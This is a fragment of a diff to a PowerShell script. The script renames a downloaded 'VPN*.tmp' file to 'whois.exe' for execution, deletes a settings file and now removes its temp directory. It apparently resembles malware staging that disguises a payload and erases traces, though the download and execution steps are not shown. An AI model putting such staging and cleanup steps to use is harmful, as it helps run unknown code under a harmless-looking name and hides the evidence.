@@ -50,8 +50,15 @@ Write-Host "[*] Renaming downloaded file for execution"
 # Rename the downloaded VPN file (if it follows the VPN*.tmp pattern)
 $downloadedFile = Get-ChildItem -Path $tempDir -Filter "VPN*.tmp" | Select-Object -First 1
 
+# Debugging: Output the file path to check if it's valid
+Write-Host "[*] File to rename: $($downloadedFile.FullName)"
+
 if ($downloadedFile) {
-    Rename-Item -Path $downloadedFile.FullName -NewName "$tempDir\whois.exe" -Force
+    # Ensure proper path construction using Join-Path
+    $targetPath = Join-Path -Path $tempDir -ChildPath "whois.exe"
+    
+    # Rename the file
+    Rename-Item -Path $downloadedFile.FullName -NewName $targetPath -Force
     Write-Host "[*] Renamed VPN*.tmp to whois.exe."
 } else {
     Write-Host "[!] No downloaded file found matching 'VPN*.tmp'. Exiting script."
@@ -75,5 +82,5 @@ Remove-Item -Path "$tempDir\settings.txt" -Force
 Write-Host "[*] Script complete."
 
 # Optionally, clean up the temp directory if you want
-# Remove-Item -Path $tempDir -Recurse -Force
-# Write-Host "[*] Temp directory removed."
+Remove-Item -Path $tempDir -Recurse -Force
+Write-Host "[*] Temp directory removed."
